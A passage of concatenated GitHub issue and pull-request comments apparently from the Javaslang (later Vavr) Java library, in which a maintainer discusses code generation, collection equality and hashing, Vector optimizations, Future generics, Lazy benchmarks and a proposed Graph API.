have a public interface, it is Multimap<K, V>. But this would not solve the problem. It is a JDK bug finding the right method.\n\n(also, why isn't multimap simply a Map>>)\n\nBecause Multimaps have methods that operate on V instead of Traversable<V>. (Seq<V> is not sufficient, we have also Set<V> and SortedSet<V>).\n\nI like the idea of generated code. It solved the one and only problem that our AbstractMultimap also solves - factor out duplicate code into a single place.\nBut the generated code is better than the AbstractMultimap. We do not have the generic-hell, no type casts, fewer types within the class hierarchy, etc. There are many benefits.\nThere is only one drawback - the code generator is a little bit harder to write than non-generated code.\n. > > I like the idea of generated code.\n\nHmmm, wasn't that your counter-argument against collection specialization?\n\nI did not mean this statement in the very general but only considering our options:\n- Making the abstract super-classes public (- this is a no-go because it is not intended to be user API)\n- Staying with package-private abstract super classes and override all methods in implementing classes. These just delegate to the super-class (- this leads to maintenance hell)\n- Introducing package-private helper classes with static methods (- this leads to unreadable, blown-up (internal) API, see current PR)\n- generate the code (- we get rid of much technical boilerplate like generics, casts, unnecessary types and method calls, etc.)\n\nOr can we make the generator source a valid Java source?\n\nInteresting idea. I have already thought about self-expanding Java code. Xtend language does this with so-called Active Annotations. Scala has Macros. But these things actually hide things like the annotations of many (in)famous Java frameworks. I like to directly write the (generator) code - no hidden magic.\nBtw - the AbstractQueue does not have this problem. The queues do not need to be generated.\n\nI would like to experiment with it (hands-on!) and see how it does feel from the development perspective. Maybe it is not as hard to maintain as we think. The Scala code generator is really easy.\n. > As long as the source code is not Strings, I don't mind :)\nI don't understand. We check-in the generated source. It is like hand-written code. Unit tests run against it. The unit tests will not be generated (from what I can see now), we use the existing Absrtact*MapTest classes.\nAlso our CI build automatically checks if a user accidentally overwrites generated code with manual changes. This breaks the build.\nGenerating the Maps and Multimaps should be safe regarding Java compilation and manual user-changes!\n. Obsolete, will be closed. We (most probably) will go the generator way.\n. > I just meant that source code should be written in an IDE recognizable format.\nThe quality of our source code and user experience are very important / priority 1. Javaslang library developer experience is also important but priority 2.\n- The public API does not change, therefore user experience is not affected.\n- A switch to generating Maps and Multimaps will (drastically?) increase the quality of our source code.\n- Maintaining the generator templates is an additional effort, it affects the developer experience.\nThe right workflow will ease the pain of maintaining generator templates:\n1. First we directly edit/change the generated code. We will have full IDE support. Editing may involve the introduction of new types or the erasure of existing types. As always, we write unit tests for the code. In this phase we do also refactoring until the code has a final state/seems to be in perfect shape.\nWe use the IDE to test the changes. We have to take care not to run the generator (via maven build), it will overwrite our changes. It is recommended to create backups, e.g. in the form of local commits that will be squashed later.\n2. If all works as expected, we adjust the generator templates in the way that they reflect the changes of the generated code we made in the first phase. We now run the code generator. In the 1st phase we committed the direct changes of the generated code. So we are able to verify if our generator adjustment is correct by looking at the git diff.\nPhase 1. increases the developer experience during generator-driven development. Phase 2. is a pain in the ass, as always in stringly-driven development. But we need to do it to increase the quality of our library.\n. Scala does behave as follows:\n``` scala\nscala> val set1 = scala.collection.immutable.SortedSet.empty[String] + (\"a\", \"c\", \"b\")\nset1: scala.collection.immutable.SortedSet[String] = TreeSet(a, b, c)\nscala> val set2 = scala.collection.immutable.Set.empty + (\"c\", \"b\", \"a\")\nset2: scala.collection.immutable.Set[String] = Set(c, b, a)\nscala> set1.equals(set2)\nres0: Boolean = true\nscala> set2 == set1\nres1: Boolean = true\nscala> set1 == set2\nres2: Boolean = true\nscala> set2.equals(set1)\nres3: Boolean = true\n```\nSequences seems to be equal too if type differs but Seq/Set does not work that way:\n``` scala\nscala> List(1, 2, 3) == Stream(1 ,2 ,3)\nres4: Boolean = true\nscala> List(1, 2, 3) equals Stream(1 ,2 ,3)\nres5: Boolean = true\nscala> List(1, 2, 3) equals Set(1 ,2 ,3)\nres6: Boolean = false\n```\nIn Javaslang equals does take the type into account. We have Value.eq() for the case that just the contained values should be compared (deep-equals). But for Sets it currently does not seem to work (in all cases).\nWe should definitely rethink the current behavior, maybe for equals, at least of Value.eq.\nChanging equals and eq are a change of behavior that is backward-incompatible. Therefore I will target it for 3.0.0.\nUpdate: For now I will consider it as bug and target 2.0.4. After investigation we might change the target to 3.0.0.\n. This changes the behavior of collection's equals method. Traversable should override equals and add a javadoc that contains a description for all existing collection types (Seq, Set, Map, Multimap, Tree, ...).\nCollection Equality\n\nThe collection libraries have a uniform approach to equality and hashing. The idea is, first, to divide collections into sets, maps, and sequences. Collections in different categories are always unequal. For instance, Set(1, 2, 3) is unequal to List(1, 2, 3) even though they contain the same elements. On the other hand, within the same category, collections are equal if and only if they have the same elements (for sequences: the same elements in the same order). For example, List(1, 2, 3) == Vector(1, 2, 3), and HashSet(1, 2) == TreeSet(2, 1).\n\nSource: Scala Documentation\n\nA test for sequences on the Scala REPL:\n```\nscala> val stream = Stream(1, 2, 3)\nstream: scala.collection.immutable.Stream[Int] = Stream(1, ?)\nscala> val list = List(1, 2, 3)\nlist: List[Int] = List(1, 2, 3)\nscala> stream equals list\nres0: Boolean = true\nscala> list equals stream\nres1: Boolean = true\nscala> stream == list\nres2: Boolean = true\nscala> list == stream\nres3: Boolean = true\n``\n. It is not a bug - it is a change of behavior. The structural equals methodValue.eqdoes not change because the order of elements returned byiterator()matters (see contract).\n. @zsolt-donca thank you! I think on the level of Value the only thing we can do is updating the Javadoc. A Traversable, e.g. a HashSet, may contain elements that have no natural order. So there will be no chance foreq` to order elements.\nWe could also add more introspection methods like\n- hasOrder() (= has underlying Comparator)\n- isSequential() (like Seq, LinkedHash* and Iterator)\n- isDistinct() (like Set)\nBut Value seems to be the wrong place for these methods, they would fit better to Traversable.\nNote: If we add more of these methods, we can build the Splitterator characteristics automatically. I think this is a good idea! Value could have a default implementation for single-valued types. Traversable should override it and use the introspection-methods to build a Splitterator.\n(see #1635)\n. @v1ctor thank you for your investigation!\n\nSo I've created a static method which is using isSequential() and isDistinct() introspection methods.\n\nWe should create static methods located in the package-private class Collections in order to hide these methods from the public API.\nIt is sufficient to do these for Seq, Set, Map and Multimap:\n```java\nclass Collections {\nstatic boolean equals(Set<T> self, Object that) {\n    ...\n}\n\nstatic boolean equals(Seq<T> self, Object that) {\n    ...\n}\n\nstatic boolean equals(Map<K, V> self, Object that) {\n    ...\n}\n\nstatic boolean equals(Multimap<K, V> self, Object that) {\n    ...\n}\n\n}\n```\nWe need also to ensure that the hashCodes are equal, if the collections are equal, especially for Sets. Because Sets may have different element order we can't just do hashCode = hashCode * 31 + x. Maybe we already have a solution in the code... (@ruslansennov that might be also a problem of HAMT, @me and also a problem of RedBlackTree).\n\n\nWhat do you think? Especially about the second problem.\n\nWe focus only on Set, Seq, Map and Multimap. Iterator, Tree and PriorityQueue are out of scope for this issue.. Great! Feel free to create an unfinished PR at any time if you want early feedback.. OUTDATED The actual version can be found below.\n\nScala will introduce 'Multiversal Equality', currently explored in Dotty (using type classes / a trait Eq). That means the types are partitioned into multiple disjoint universes (by type) and equality is defined there. Note: we do this already for our types (like Option) by checking instanceof.\nIn order to keep symmetry, i.e. c1.equals(c2) <=> c2.equals(c1), for all collections c1, c2 we need to go a step further. We will partition collections into Seq, Set, Map, ... (as already described above). But additionally we will define sub-partitions, e.g. the partition Set has the sub-partition SortedSet.\nWhen computing equals() we determine the actual partition by calculating the upper type-bound of the given collections. Example:\n\nequals(Set, SortedSet) -> upper bound = Set\nequals(SortedSet, Set) -> upper bound = Set\nequals(SortedSet, SortedSet) -> upper bound = SortedSet\n\nWhen having equals(SortedSet, SortedSet) we need to respect element order. We do this by using iteration order during comparison.\n\nIdea\nWe might expect our equals() relation to form an equivalence class, i.e. the collection types are partitioned:\n\nFor every element a in X, a ~ a (reflexivity),\nFor every two elements a and b in X, if a ~ b, then b ~ a (symmetry),\nFor every three elements a, b, and c in X, if a ~ b and b ~ c, then a ~ c (transitivity).\n\n(Here X is a collection type and ~ \u2286 X x X, a ~ b := equals(a, b) == true)\nI suggest to relax this equivalence property a bit by allowing sub-partitions ~~, i.e. the classes of elements that relate to each other aren't disjoint any more:~~. Update: We still have disjoint partitions. I think sub-partition is the wrong word here. It is just part of the definition of the equals relation.\n\nIn particular we need that for our sorted collections.\nProposed solution\n```java\nfinal class Collections {\nstatic <T> boolean equals(Seq<T> seq1, Object o) {\n    if (o == seq1) {\n        return true;\n    } else if (seq1 != null && o instanceof Seq) {\n        @SuppressWarnings(\"unchecked\")\n        final Seq<T> seq2 = (Seq<T>) o;\n        return seq1.size() == seq2.size() && areEqual(seq1, seq2);\n    } else {\n        return false;\n    }\n}\n\nstatic <T> boolean equals(Set<T> set1, Object o) {\n    if (o == set1) {\n        return true;\n    } else if (set1 != null && o instanceof Set) {\n        @SuppressWarnings(\"unchecked\")\n        final Set<T> set2 = (Set<T>) o;\n        if (set1.size() != set2.size()) {\n            return false;\n        }\n        return !set1.isOrdered() ? set2.forAll(set1::contains) :\n               !set2.isOrdered() ? set1.forAll(set2::contains) : areEqual(set1, set2);\n    } else {\n        return false;\n    }\n}\n\n...\n\n// already existis!\nstatic boolean areEqual(Iterable<?> iterable1, Iterable<?> iterable2) { ... }\n\n}\n```\nTests:\n```java\n{\n    Set set1 = Set(1, 2, 3);\n    Set set2 = Set(\"a\", \"b\", \"c\");\n    println(equals(set1, set2)); // = false (especially no ClassCastException)\n    println(equals(set2, set1)); // = false\n}\n{\n    Set set1 = SortedSet(1, 2, 3);\n    Set set2 = API. SortedSet((i, j) -> i - j, 1, 2, 3);\n    println(equals(set1, set2)); // = true (because of same order)\n    println(equals(set2, set1)); // = true\n}\n{\n    Set set1 = SortedSet(1, 2, 3);\n    Set set2 = API. SortedSet((i, j) -> j - i, 1, 2, 3);\n    println(equals(set1, set2)); // = false (because of different order)\n    println(equals(set2, set1)); // = false\n}\n{\n    Set set1 = Set(1, 2, 3);\n    Set set2 = API. SortedSet((i, j) -> j - i, 1, 2, 3);\n    println(equals(set1, set2)); // = true (ignoring different order)\n    println(equals(set2, set1)); // = true\n}\n```\nReferences\n\nScala Collections: Equality\nMultiversal Equality for Scala (Martin Odersky, May 2016)\nlampepfl/dotty issue 1247: \"Multiversal Equality\"\nlampepfl/dotty issue 818: \"Wanted: Strawman proposals for new collections architecture\". @v1ctor There is a counter-example for transitivity of the proposed Set equality:\n\n\nFor every three elements a, b, and c in X, if a ~ b and b ~ c, then a ~ c (transitivity).\n\njava\nSet<Integer> a = API.<Integer> SortedSet((i, j) -> i - j, 1, 2, 3);\nSet<Integer> b = Set(1, 2, 3);\nSet<Integer> c = API.<Integer> SortedSet((i, j) -> j - i, 1, 2, 3);\nThen equals(a, b) == true and equals(b, c) == true but equals(a, c) == false.\nWe have to think about another implementation...\n\nIn Scala:\n```scala\nscala> val a: Set[Int] = SortedSet(1, 2, 3)((i, j) => i - j)\na: scala.collection.immutable.Set[Int] = TreeSet(1, 2, 3)\nscala> val b: Set[Int] = Set(1, 2, 3)\nb: scala.collection.immutable.Set[Int] = Set(1, 2, 3)\nscala> val c: Set[Int] = SortedSet(1, 2, 3)((i, j) => j - i)\nc: scala.collection.immutable.Set[Int] = TreeSet(3, 2, 1)\nscala> a == b\nres0: Boolean = true\nscala> b == c\nres1: Boolean = true\nscala> a == c\nres2: Boolean = true\n``\n. We can't just use thecontains` method for SortedSets - it will throw at runtime:\njava\nSet<Integer> set1 = SortedSet(1, 2, 3);\nSet<String> set2 = SortedSet(\"a\", \"b\", \"c\");\nprintln(equals(set1, set2)); // throws ClassCastException\nprintln(equals(set2, set1)); // throws ClassCastException\n. @v1ctor You were right! - using set1.forAll(set2::contains) works fine for all types of sets and is also used in Scala:\nscala\n// scala\ntrait GenSetLike[A, +Repr] with (A => Boolean) {\n  override def equals(that: Any): Boolean = that match {\n    case that: GenSet[_] =>\n      (this eq that) ||\n      (that canEqual this) &&\n      (this.size == that.size) &&\n      (try this subsetOf that.asInstanceOf[GenSet[A]]\n       catch { case ex: ClassCastException => false })\n    case _ =>\n      false\n  }\n}\n(Source: scala/scala: GenSetLike.scala)\nWe only need to catch ClassCastException that may occur when calling SortedSet.contains():\nPlease take the following equals impl for Sets, it obeys all laws of an equivalence relation:\njava\n// javaslang\n@SuppressWarnings(\"unchecked\")\nstatic <T> boolean equals(Set<T> set1, Object o) {\n    if (o == set1) {\n        return true;\n    } else if (set1 != null && o instanceof Set) {\n        final Set<T> set2 = (Set<T>) o;\n        try {\n            return set1.size() == set2.size() && set1.forAll(set2::contains);\n        } catch(ClassCastException x) {\n            return false;\n        }\n    } else {\n        return false;\n    }\n}\nBecause we can't rely on the order of elements for Sets, we need another hashing strategy. Scala uses the following:\nscala\n// scala\ntrait GenSetLike[A, +Repr] with (A => Boolean) {\n  override def hashCode()= scala.util.hashing.MurmurHash3.setHash(seq)\n}\nProposed hashing strategy see here.\n. Fixed with #1948. Yes, that would be great! You are familiar with the code generator (Generator.scala), right?\n. Yes, I also do a clean. Choose one of these:\n- mvn clean generate-sources for fast results\n- mvn clean compile to see if your generate code does compile\n- mvn clean test to see if the unit tests still run after applying changes\nBefore pushing to Github we should also do a\n- mvn javadoc:javadoc to see, if the doclint complains\n. Fixed with #1559\n. Wow - this is a really interesting change - The Javaslang way. Automatically switching to primitive representations, I think the Java world hasn't seen that to date, right?\nWill review all open Vector PRs today...\n. @paplorinc \nI see your effort and the improvements, thank you! The implementation is very low level and got more complicated because of the heading and trailing arrays. But Vector will be very useful as general purpose collection.\nTherefore I will merge this change. Please resolve the conflicts and I will pull it in.\nDo I also have to pull in \"Vector optimizations #1522\" or does this PR also contain all changes of #1522?\n. What about the reflection stuff? Will Vector work with GWT?\nIf not, we should discuss how to proceed further.\n. @paplorinc it is important that GWT follows Javaslang core, not the other direction.\nWe write efficient code. If we can omit GWT incompatible API, we will to it. But we do not write slower/worse code in order to make GWT work. Just saying.\nPlease make the GWT-dpecific changes in a separate commit for better review-experience.\n. No, please do not change the implementation. IntelliJ showed a 'false positive'. The editor stated that these methods are not used.\nI need some more time to review.\nI see that from the performance perspective the code is fast. But on the abstraction level we did not find the right way yet I think. Future and Promise are a good example. I looked at the Scala code of Viktor Klang. There is a very small core where synchronization logic takes place (in Javaslang it is FutureImpl). It is like an onion. This core is very small. The outer layers don't know anything about the core other than it's public interface (take a look at Future). So it is ensured that no synchronization logic leaks to the outside. It is all very elegant and compositional. Some of the best code I've ever seen.\nOur Vector works different. It is so highly optimized that the logic of the BMT leaks to the outside. I'm also not sure if Vector should know about the Leaf types. For reasons of stability and maintainability of the library this is really evil. The complexity increases (more than linear). I'm not sure if I'm able to maintain it or to add new functionality.\nI need some additional time to look over the code. But for now I see no reason to change anything.\n. Btw - I intentionally did no special handling of primitives throughout Javaslang. It was a design decision. I did not want to fix the 'errors' of the Java language. With Project Valhalla we probably get primitive generics. No boxing will take place any more. Then the 'problem' will disappear automatically.\n. @paplorinc you are right. If I think there is sth leaking, I will provide a better solution. (Will be offline today most of the time...)\n. Will check the code tomorrow!\n. @paplorinc Will get my hands on the new version this evening. Sorry for the delay - so many things to do in parallel. The new Vector will be awesome!\n. @paplorinc \n\nMostly done - and pushed -, not sure about embedding them to the same file, though.\nWhat's the advantage exactly, are we trying to simulate a sealed trait in Java this way?\n\nYes, it is some kind of sealed trait behavior. It is a kind of coding style I applied in different places of Javaslang. I want to keep together things that belong together. It is some kind of local module. The implementation types are never used directly, like List.Cons & List.Nil. Let's apply this change and align to the other classes.\n. > Is there a non-hacky way for this, I'm not proud of how this code generation part turned out :/\nCurrently we need to do it the hacky way :-/\nWhen we move to Gradle  I hope there is a better Scala integration. We will split the generator in several parts (one for ArrayType, one for Functions, one for Tuple, etc.)\n. @paplorinc\n\nCould you please do it after merging this :)?\n\nWill do that, Sir. Compared to your great ideas that materialized in this PR this looks like a warm, mild summer breeze to me :)\n. Many thanks!\n. Thanks!\n. Perfect, this looks awesome!!\n. @talios: Are you still looking at this? Would be cool to have the possibility to start benchmarks with\nbash\nmvn clean test -P benchmark\nIf it is not possible, we will fall back to the current working version:\nbash\nmvn clean test -P benchmark -pl javaslang-benchmark\nI will wait for some feedback (if we still try to do it) before merging. It is ok to have the latter solution...\n. This change look good! Will pull it now.\n. Thank you :)\n. Looks nice, thx!\n. Thank you!\n. Thx!\n. Thanks for the changes!\nWe still have some time, the JDK9 compatibility will start to be interesting when Java 9 is released (which may take a while).\nWe should understand why existing things break and how we can fix it. The first approach should be to fix the JDK 9 (by issuing bugs to the tracker). \n. this sounds great! will check it tomorrow, need sleep :)\nthx!. Wow, that's awesome! Thank you :)\nI've experimented a bit with travis-ci env vars the last days. I think it is possible to start multiple builds in parallel with different configurations. Maybe we are possible to start a jdk8 and jdk9 build in parallel then. I think if one node fails, the complete build fails. We will see. This will be part of #1465 . @paplorinc Please file a ticket for the memoization bug. I will investigate it.\nIt is possible to use the env to spawn multiple parallel build nodes. We could use this technique to run multiple builds in parallel. But the question is for what purpose? It is important that a future Java 9 project (3rd party), that uses Javaslang, has no problems at runtime (and compile time). Until Javaslang moves to Java 9 only we need no Java 9 builds.\n. Ok, thank you, we will wait then!\n. @ruslansennov good news! We still have some time before releasing 2.1.0. We should wait for the final GWT 2.8.0 version.\n. yes, will do!\n. > To avoid GWT-incompatible commits in future\nHow do we achieve this? Does the travis-ci build check GWT compatibility?\n. Java's type system does not allow us such a flatten method to be defined as instance method - it had to be a static method. However, it is uncommon to flatten the 'negative' (error) case. For example Either.map() and Either.flatMap() operate on the right value.\nI think we need to prevent that Validation<List<E>, Tn> are combined to a Validation<List<List<E>>, Tn>. This could be accomplished by changing Validation<E, T> in the way that it implicitly has a list of errors instead of an error. I.e. Invalid<E, T>.getError() returns a List<E> instead of an E. Then we do not need to care about flattening any more at all. It is automatically done on each operation.\n@io7m could you provide a complete (simple) example where it is necessary to flatten? Maybe the same could accomplished without flattening. I will take a look. Thank you!\n. Great many thanks - I will get my hands on it...\n. @io7m thank you for the example, it is good to see a use-case in practice.\n\nI'm almost never returning a Validation with an error type that isn't a sequence of some sort\n\nI have to think about that. The most annoying thing currently is to deal with single invalid values and the step to sequences of invalid values on the type system. Especially when combining Validation instances.. @grzesiek-galezowski we could do that! PR\u2019s welcome ;). Awesome!. Validation in this form will probably not part of Vavr 1.0 - it does not scale well because of the restriction to Function8.\nInstead we should think about a redesign from scratch or leave it away and stick to alternatives like Either.sequence.... Veeerryy nice :) Will review it in a minute...\n. Thank you :)\n. Out of scope for Vavr. @paplorinc thx\n. Thank you for your PR! The issue #1555 was recently solved with PR #1948 in a general way (for Seq, Set, Map, Multimap).. Aargh, sorry @paplorinc. I've overseen the comments. Will apply your comments soon and send a new PR.\n. Great, thank you!\n. @mvh77 thank you for the hint! I also think that this topic needs to be investigated, it is not trivial.\nMaybe we could wrap the default executor and prevent it from shutdown. Internally we could add a JVM shutdown hook that shuts down the default executor when the JVM exits. Don't know if that works well.\nDo you have a Gist with code examples of your experiments?. @mvh77 is right, this is risky and introduces unexpected behavior.\nI addressed @Ramblurr's wish in #2093. We are now using ForkJoinPool.commonPool(), like Scala. It creates daemon threads that do not prevent the VM from shutdown.. > I named transformResult the new transform function because of type erasure...\nThe current API names the underlying Try<T> value and has the following methods:\njava\nget(): T\ngetCause(): Option<Throwable>\ngetValue(): Option<Try<T>>\nSo I think the best name choice for our transform method is transformValue() in order to align with the existing getValue().\nPlease rename it along with applying my other review comments.\nMany thanks!\n. Great, thanks :) Looking forward to pulling it!\n. @nicolaferraro Thank you, we can trust the compiler. Your version ? super Try<T> is correct!\n``` java\nimport javaslang.control.Try;\nimport java.util.function.Function;\npublic class Test {\npublic static void main(String[] args) {\n\n    Function<Try<String>, Try.Success<Integer>> f1 = v -> (Try.Success) Try.success(1);\n    Function<Value<CharSequence>, Try.Success<Integer>> f2 = v -> (Try.Success) Try.success(1);\n    Function<Value<String>, Try.Success<Integer>> f3 = v -> (Try.Success) Try.success(1);\n    Function<Value<CharSequence>, Try.Success<Integer>> f4 = v -> (Try.Success) Try.success(1);\n    Function<Try<String>, Try<Number>> f5 = v -> Try.success(1);\n    Function<? super Try<? super String>, Try.Success<Integer>> f6 = v -> (Try.Success) Try.success(1);\n\n    Future<String> future = null;\n\n    Future<Number> result0_1 = future.transformValue0(f1); // OK\n    Future<Number> result0_2 = future.transformValue0(f2); // Error\n    Future<Number> result0_3 = future.transformValue0(f3); // Error\n    Future<Number> result0_4 = future.transformValue0(f4); // Error\n    Future<Number> result0_5 = future.transformValue0(f5); // OK\n    Future<Number> result0_6 = future.transformValue0(f6); // Error\n\n    Future<Number> result1_1 = future.transformValue1(f1); // OK\n    Future<Number> result1_2 = future.transformValue1(f2); // Error\n    Future<Number> result1_3 = future.transformValue1(f3); // OK\n    Future<Number> result1_4 = future.transformValue1(f4); // Error\n    Future<Number> result1_5 = future.transformValue1(f5); // OK\n    Future<Number> result1_6 = future.transformValue1(f6); // OK\n\n    Future<Number> result2_1 = future.transformValue2(f1); // Error\n    Future<Number> result2_2 = future.transformValue2(f2); // Error\n    Future<Number> result2_3 = future.transformValue2(f3); // Error\n    Future<Number> result2_4 = future.transformValue2(f4); // Error\n    Future<Number> result2_5 = future.transformValue2(f5); // Error\n    Future<Number> result2_6 = future.transformValue2(f6); // OK\n\n    Future<Number> result3_1 = future.transformValue3(f1); // Error\n    Future<Number> result3_2 = future.transformValue3(f2); // Error\n    Future<Number> result3_3 = future.transformValue3(f3); // Error\n    Future<Number> result3_4 = future.transformValue3(f4); // Error\n    Future<Number> result3_5 = future.transformValue3(f5); // Error\n    Future<Number> result3_6 = future.transformValue3(f6); // Error\n\n}\n\ninterface Future<T> extends Value<T> {\n\n    <U> Future<U> transformValue0(Function<Try<T>, ? extends Try<? extends U>> f);\n\n    <U> Future<U> transformValue1(Function<? super Try<T>, ? extends Try<? extends U>> f);\n\n    <U> Future<U> transformValue2(Function<? super Try<? super T>, ? extends Try<? extends U>> f);\n\n    <U> Future<U> transformValue3(Function<Try<? super T>, ? extends Try<? extends U>> f);\n\n}\n\n}\n```\n. Thank you, great addition!\n. @paplorinc please review\n. ...still need to do the benchmarks...\n. @paplorinc I need your JMH expertise :)\nIn one benchmark I need an uninitialized lazy value. We loop an amount of TIMES. Within the loop the lazy val needs to be not initialized on each call, to get sure we enter the synchronized block.\nIn fact we need also a test case with several threads, which is hard to benchmark because the system scheduler is not deterministic :-(\n- how do I ensure that the testee is not initialized? Do I use @Setup with Level.Invocation? This is not recommended (see http://java-performance.info/jmh/)\n- get() returns an int value 1. Does the boxing influence the test in a negative way? I think not because it is a constant factor, regardless of the test case.\njava\n        @Benchmark\n        public int slang_localVar() {\n            int aggregate = 0;\n            for (int i = 1; i <= TIMES; i++) {\n                // doubleCheckLocal needs to be uninitialized\n                aggregate += doubleCheckLocal.get(); // get() returns 1\n            }\n            assert aggregate == TIMES;\n            return aggregate;\n        }\nThx in advance!\n. Improved by @paplorinc in #1577 and therefore closed as duplicate.\n. Wow, so many gems hidden in a small class like Lazy.\nWould love to see updated benchmark results of the applied code review comments.\n. Considering concurrent reads of value the optimization may lead to inconsistent reads (see comment above). Therefore we should implement a safe solution.\nThx for the great benchmarks!\n. @paplorinc \n\nIf I'm mistaken, could you please provide a test that fails?\n\nNot sure if I'm able to do it. It requires multiple threads and one thread that reads an outdated value while checking at the same time that the value was updated.\nI'm sure that I'm right here.\n. > If I'm mistaken, could you please provide a test that fails?\nWill see what is possible...\n. Great, thank you!\n. Great - many thanks!\nI love to see many small steps and a great overall improvement.\n. Yep, good catch. I will close this one as duplicate.\n\nOff-topic: No 1 on my wish-list: zero issues inbox :)\nI will move the parser-stuff to its own project soon. Also I will defer the reactive streaming topic. For the health of Javaslang core it is best to keep it thin. The collections add already a complexity that fills this module completely.\n. @paplorinc you are right - it makes no sense to have toArray(T[]). That is the reason I introduced the simpler toArray(Class<T>).\nIf an application of toArray(Class<T>) compiles, it is correct. Therefore this is the best solution we can come up with.\nFor now, we will not implement the unsafe case, I don't see the urge to do it. We have many other things to do.\n. I'm not sure. Is it possible to fix our variant, e.g. by first checking type.isPrimitive() and then decide further how to proceed?\nI will play around a bit.\nSafety first.\n. See #1585\n. I think to start a Strawmans implementation myself to get a feeling for the topic. This first prototype should not be integrated into the Traversable hierarchy in a first step.\nCurrently I see no problem with back-references resp. cycles. Let's think about it mathematically:\nA graph G := (V, E) is a tuple of a set V of vertices/nodes and a set of edges E \u2286 V x V.\n- For an undirected graph the following holds: \u2200 x, y \u2208 V : (x, y) \u2208 E \u21d4 (y, x) \u2208 E. (Idea: I would add an isDirected flag to the constructor. If isDirected both edges are added to the set when one of them is added etc.)\n- We may create a weighted graph G := (V, E), with weights W and a total ordering \u2264 \u2286 W x W, such that E \u2286 V x V x W.\nKeeping this abstraction will make it easier to implement existing algorithm, e.g. calculating the minimal spanning tree (MST), find the shortest path (Knapsack problem) etc.\nUsing Vector under the hood is an implementation detail. We should not do that at this design stage. (When all that we have is a hammer everything starts to look like a nail.)\nThe strawmans Graph looks like this - we just think in interfaces for now:\n``` java\ninterface Graph {\n// vertices = HashSet.sequence(edges).apply((v1, v2) -> v1.union(v2))\nstatic Graph<T> of(Iterable<? extends Tuple2<? extends T, ? extends T>> edges) {\n    ...\n}\n\n// need to think about behavior when there are edges using vertices not present in the set...\nstatic Graph<T> of(Set<? extends T> vertices, Set<? extends Tuple2<? extends T,  extends T>> edges) {\n    ...\n}\n\nboolean isDirected();\n\nboolean isWeighted();\n\nSet<T> getVertices();\n\nSet<Tuple2<T, T>> getEdges();\n\n}\n```\nOr should an undirected graph have a method Set<Set<T>> getEdges()... ?\n``` java\ninterface WeightedGraph extends Graph {\n...\n\n}\n```\n. Before looking into other libraries (myself), I want to model it myself. Then I will take a look at other definitions and learn.\n. @jbduncan nice, we will take it into account! thx\n. Graphs are, like Trees, multi purpose. There exist many libraries for specific use cases. Therefore it isn't prio 1 for us to develop the n-th Graph type.. Before starting an implementation I want to have more insight regarding basic modelling directives and API.\n\nHow to model vertices and edges?\nHow to model directed, undirected graphs. E.g. If a graph is undirected then v1, v2 \u2208 V, (v1, v2) \u2208 E => (v2, v1) \u2208 E.\n\n```java\n// syntax borrowed from https://github.com/anvaka/VivaGraphJS/wiki/Basic-graph-operations\nclass Graph {\nfinal Set<Node<T>> nodes;   // naming: node instead of vertex\nfinal Set<Link<T>> links;      // naming: link instead of edge\nfinal boolean isDirected;\n\nGraph<T> addNode(T value) {\n    if (containsNode(value)) {\n        return this;\n    } else {\n        final Set<Node<T>> newNodes = _addNode(value);\n        return new Graph(newNodes, links, isDirected);\n    }\n}\n\nGraph<T> addLink(T from, T to) {\n    if (containsLink(from, to)) {\n        return this;\n    } else {\n        // add does nothing if value is already contained\n        final Set<Node<T>> newNodes = _addNodes(from, to);\n        final Set<Link<T>> newLinks = _addLink(from, to);\n        return new Graph(newNodes, newLinks, isDirected);\n    }\n}\n\nboolean containsNode(T value) { ... }\n\nboolean containsLink(T from, T to) {\n    /*\n       if (isDirected) search(Link(from, to)) else search(Link(from, to) || Link(to, from))\n     */\n}\n\n// internal? why not use value directly and remove Node type?\nprivate static class Node<T> {\n    final T value;\n    // do we need \n}\n\n// internal? why not use Tuple2 instead?\nprivate static class Link<T> {\n    final Node<T> from;\n    final Node<T> to;\n    // do we need isDirected?\n    // do we need weights?\n}\n\n}\n```\nObservations:\n\nGraph should be simple. It would be nice to make the Node type generic. This gives the users the possibility to model complex nodes (with weight, coloring etc) and add their own Graph algorithms.\nGiven some design decisions and constraints, we can model the API without thinking about the implementation.\nThinking about the implementation, what would be the best way to model undirected graphs? E.g. bake the logic into the Link type or perform checks in each graph operation?\nWhat are the best underlying data structures?, We do not want to search Links in O(n). At least it should be O(log n)...\n\nExample:\n```java\n// does not compile, result is of type Graph\nGraph g = Graph.directed() // creates an empty, directed graph\n    .addLink(\"Hi\", \"Vavr\");\n// does compile. drawback: a class parameter does not support generics, like Graph.directed(List.class)\nGraph g = Graph.directed(String.class) // creates an empty, directed graph\n    .addLink(\"Hi\", \"Vavr\");\n// does compile, works for every use-case\nGraph g = Graph. directed() // creates an empty, directed graph\n    .addLink(\"Hi\", \"Vavr\");\n```\n\nA first step is to look at Haskell and Eclipse Collections. What are the use cases for Graphs in practice? E.g. do we need coloring and weights for nodes and edges? How do we model more complex Graphs like Multigraphs?\n\nMaybe it is already supported with a generic node type but the operations will differ. Most probably we need two types: Graph and Multigraph (the latter could be added later, if necessary).\nAre there other types pf graphs we need to consider?\n\nLater we will perform typical Graph operations like\n\ngetMinimalSpanningTree() // if exists, might not be unique\nisAcyclic()\nisComplete()\nisBipartite()\ngetForest() // if exists\ngetChromaticIndex()\n...\n\nSee also:\n\nhttps://en.wikipedia.org/wiki/Graph_operations\nhttps://en.wikipedia.org/wiki/Category:Graph_operations\n\n\nWe already had problems when performing operations that involve several similar collections with different behavior, like two SortedSets that have a different underlying Comparator.\nHow will it work for different Graphs<<T> g1, g2 of same type T but g1 is directed and g2 is undirected. E.g. g1.intersection(g2) vs g2.intersection(g1).\nWe need to define that.. I assigned myself, I will create a suggestion.. Out of scope for Vavr, we align to Scala collections.. @ashrko619 please let's keep the scope of this PR focused on the methods that return wrapped Seq types.\n\nI see some more opportunities where a Stream can be used instead of other implementations.\n\nWe should discuss these by creating issues first. I would not 'refactor' the example you mentioned. A queue is backed on two lists: rear and front.\nIt makes most sense to switch to a Stream return type when having costly operations that can be deferred by making them intermediate/lazy. In your example of the Queue (link above) the List is only used to iterate elements. Also making the whole Queue lazy makes not much sense in my opinion because the elements are already known (they are enqueued and dequeued). Lazy evaluation makes most sense when the elements are not yet known.\n. Fixed with #1605 . Yes and no. Otherwise it might throw at runtime. However, an assignment to a primitive array result does not compile.\n=> Safe!!\n. Interesting case :)\njava\n@Test\npublic void shouldConvertToJavaArrayWithTypeHintPrimitiveVoid() {\n    final Value<Void> value = of(null, null);\n    final Void[] array = value.toJavaArray(void.class);\n    if (value.isSingleValued()) {\n        assertThat(array).isEqualTo(new 